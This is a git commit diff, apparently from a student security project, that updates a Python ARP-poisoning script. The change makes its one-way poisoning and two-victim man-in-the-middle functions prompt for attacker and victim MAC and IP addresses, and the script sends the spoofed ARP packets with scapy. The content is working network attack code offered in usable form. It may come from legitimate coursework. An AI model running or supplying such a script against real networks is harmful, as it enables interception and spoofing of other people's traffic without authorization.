2e14962baebfc032fcbd47eb3ffc373df593e011
mrtkrl498339 <m.kirli@student.tue.nl>
2023-05-29 17:07:12 +0200

    Update arpPoison.py
    Modified to take user input

--- arpPoison.py
+++ arpPoison.py
@@ -11,25 +11,26 @@ def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
     sendp(arp, iface = "enp0s3")
     
 def oneWayPoisoning():
-    macAttacker = ""
-    ipAttacker = ""
+    
+    macAttacker = input("Attacker MAC address:")
+    ipAttacker = input("Attacker IP address:")
 
-    macVictim = ""
-    ipVictim = ""
+    macVictim = input("Victim MAC address:")
+    ipVictim = input("Victim IP address:")
 
-    ipToSpoof = ""
+    ipToSpoof = input("IP address to impersonate:")
     
     arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
     
 def mimAttack():
-    macAttacker = ""
-    ipAttacker = ""
+    macAttacker = input("Attacker MAC address:")
+    ipAttacker = input("Attacker IP address:")
 
-    macVictim1 = ""
-    ipVictim1 = ""
+    macVictim1 = input("Victim 1 MAC address:")
+    ipVictim1 = input("Victim 1 IP address:")
     
-    macVictim2 = ""
-    ipVictim2 = ""
+    macVictim2 = input("Victim 2 MAC address:")
+    ipVictim2 = input("Victim 2 IP address:")
     
     arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
     arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
